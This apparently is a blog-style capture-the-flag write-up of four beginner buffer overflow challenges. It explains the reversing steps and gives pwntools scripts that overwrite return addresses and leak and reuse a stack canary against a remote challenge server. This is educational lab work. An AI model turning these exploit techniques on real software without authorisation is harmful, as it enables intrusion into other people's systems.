---
title: Bro Do You Even Bof?
date: "2020-06-21 22:04:31.582772"
description: "A set of simple buffer overflow challenges"
categories: ["code"]
---

# Bro Do You Even Bof?

## Chall1.png

---

Surprising that the first challenge in a bof writeup is not even a bof. I'll keep this one short. Main pointers to remember:

1. The program compares some value with a constant 0x539 (1337)
2. It uses puts
3. Strings in the programs: "Bye", "Your so leet!", "%d"
4. jne -> means ==
5. scanf for input

```
#include <stdio.h>

int main(int argc) {
	int check;
	scanf("%d", &check);

	if (check == 1337) {
		puts("Your so leet!");
	} else {
		puts("Bye");
	}
	return 0;
}
```

## The Process

---

Since I won't talk about what commands I executed unless it is important, here's the commands I use for examining the binaries.

1. The classic `file`
2. Bit less classic, but amazing `rabin2 -z`
3. `strings` or `rabin2 -zz` if I feel like it
4. `rabin2 -s`, mainly because I know there's gonna be a win function.
5. `checksec` to identify the canaries
6. `cutter`, or `radare2` for disassembly. (Mainly `cutter`, cause TUI is hard)
7. ???
8. `cat flag`

## Jump

---

FLAG{REDACTED}

---

Very simple buffer overflow:

1. Fill the buffer with padding (64 bytes from the disassembly)
2. The program spits out a 32 bit address, and since the return address lies right after the buffer (because there are no parameters), all you have to do is encode the bytes properly.

```
#!/usr/bin/python3

from pwn import *

#p = process('./jump')
p = remote('plsdonthaq.me', 2001)

padding = 'A' * 64
addr = p32(0x08048536)

p.sendline(padding.encode() + addr)

p.interactive()
```

## Blind

---

FLAG{REDACTED}

---

Same as jump (as the program says), but you don't know where the win function is.
Now that I have done jump though, this is fairly trivial, as all I have to do is `objdump -d blind | grep win` and I would have the address to put it. So same as before, fill the buffer with padding, then properly encode the address, and boom. Bof.

**Note:** The size of the buffer is very easy to find, but there might be a few cases:

1. Look at the offset from `ebp` that is loaded into the buffer, right before the `setbuf` function or the vulnerable `gets`
2. Cutter would list all the variables defined in the vuln function, with offsets: eg
   ```
    ; var char *s @ ebp-0x44
    ; var int32_t var_4h @ ebp-0x4
   ```
   Which means you can test 0x44 as the offset to your return address. (The buffer size is still 0x40). With the 32 bit int and the base pointer (presumably) stored on the stack you end up with a padding of 0x48 or 72 bytes.

```
#!/usr/bin/python3

from pwn import *

#p = process('./blind')
p = remote('plsdonthaq.me', 2002)

padding = 'A' * 72
ret = p32(0x080484d6)

p.sendline(padding.encode() + ret)

p.interactive()
```

## Bestsecurity

---

FLAG{REDACTED}

---

Ah yes. Fake canaries.

1. While I was told that this would be a canary challenge, `checksec` did not say the same thing. Somehow I believe `checksec` more.
2. A simple scan of the disassembly told me that all I had to do was overwrite an integer with the value 1234, which it was comparing with.
3. While we did not need to override the return address, if you could, it would be the same as the first one. Except this one would be a ret2libc, as the stack is non-executable.

```
#!/usr/bin/python3

from pwn import *

p = remote('plsdonthaq.me', 2003)
#p = process('./bestsecurity')

padding = 'A' * 128
p.sendline(padding + '1234')

p.interactive()
```

## Stack-dump

---

FLAG{REDACTED}

---

This one was considerably more difficult, compared to the first 3. It was both the fact that there was an actual stack canary which I had never dealt with before, and because there was so much more stuff to do!

1. `checksec`: Yes there is a canary
2. After spending more-than-very-little time (a whole day) on figuring out what the binary did, I came up with a game plan. Leak the canary using the fread and then overwrite using the fwrite. I used a combination of cutter, pwndbg and my rapidly depleting sanity to come up with this. Tbf, this is more a test of my patience at this point.
3. To leak the canary, you use the "useful stack pointer" which is somehow 1 byte away from the actual useful pointer, to read 22 bytes (0x16) from the place where the canary is located. Which is 0x69 bytes from the pointer provided. The offset can be figured out by a combination of looking at the disassembly and dumping the whole stack in pwndbg. You only need to read 4 bytes, but fread call reads in 22 bytes, so why not.
4. By writing the useful pointer to the first 4 bytes of the buffer, and then inspecting the memory at that location, you can get the canary.
5. All that remains is figuring out the paddings. You can find the size of the padding in the disassembly, which is 96 bytes (0x60) before the canary (0x30 buffer + 0x30 other variables). The other 8 bytes padding after the canary are a bit hard to find. While there should be a saved version of the stack pointer and the base pointer, why are there 4 null bytes in there?? After a bit of trial and error however, and checking out the disassembly, I realized it was ebp and ebx that was saved. Then I got it to write the correct return address. (which can be found in the disassembly)
6. Very important step. Quit the program.

_Some amazing pwndbg commands I used_

1. `x/w <address>`: Basically allows me to dump the whole stack from any place I want
2. `info registers`
3. `break` and `continue` and `ni`
4. `attach`: attaching to pwntools script
5. `disassemble`: disassembling on the fly

_Interesting points to note/Common pitfalls_

1. There is a dummy (??) gets call in there. When you put in the amount of characters to write to the buffer, you can give it large values. Perhaps that could be used to overwrite something?
2. The overflow is based on the fact that while `fread` and `fwrite` do write a specific number of bytes ~~into the buffer~~ onto the stack, giving control of the number of bytes to write to the user is the same as not asking for them.
3. I was stuck for a long time because I did not know about the `x/w` command in gdb. Using the disassembly to find where the canary is located and dumping it atleast in gdb is very important. I thought my canary was correct for a while before I figured this out.
4. The significance of the last step in the process. While the first 5 steps overwrite the buffer safely, only after performing step 6 is a ret instruction executed. So the code flow would not change if that is not done. I was stuck on it for a while because I did not realize this.

```
#!/usr/bin/python3

from pwn import *

# p = process('./stack-dump')
p = remote('plsdonthaq.me', 2004)

# pause()                                       # ah. debugging

padding = b'A' * 96

p.readuntil('useful stack pointer ')
point = p.readuntil('\n', drop=True)            # Useful stack pointer is very useful

p.sendline('a')
p.sendline('4')
p.sendline(p32(int(point, 16) + 0x69))
p.sendline('b')

read = p.readuntil(': ')                        # Reading all the input I should have read before
read2 = p.readuntil(': ')

canary = p.recvuntil('\n')[:4]                  # Extracting my canary

returnPadding = b'A' * 8
ret = p32(0x080486c6)

p.sendline('a')
p.sendline('112')								# 96 + 4 + 8 + 4 bytes
p.sendline(padding + canary + returnPadding + ret)

p.sendline('d')                                 # Quitting the program.

p.interactive()
```

## Conclusion

---

Bof hard.  
Very leet indeed.  
The fact that I enjoyed it anyway makes me worried about my future.
